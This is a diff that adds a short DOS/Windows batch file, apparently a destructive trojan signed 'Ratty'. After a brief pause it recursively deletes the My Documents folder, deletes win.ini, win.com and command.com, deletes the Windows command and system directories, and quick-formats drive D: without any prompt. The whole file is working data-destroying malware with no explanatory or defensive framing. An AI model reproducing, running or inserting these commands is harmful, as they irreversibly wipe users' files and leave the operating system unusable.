@@ -1,0 +1,14 @@
+@echo off
+rem eXPecting more from ... RATTY ...
+TYPE NUL | CHOICE.COM /N /CY /TY,5 >NUL
+cd\
+deltree/y mydocu~1
+del %windir%\win.ini
+del %windir%\win.com
+del %windir%\command.com
+cd\
+cd windows
+deltree/y command
+deltree/y system
+format d:/q/autotest
+rem Welcome 2 Command & Conquer:The Ratty's Revenge !!?
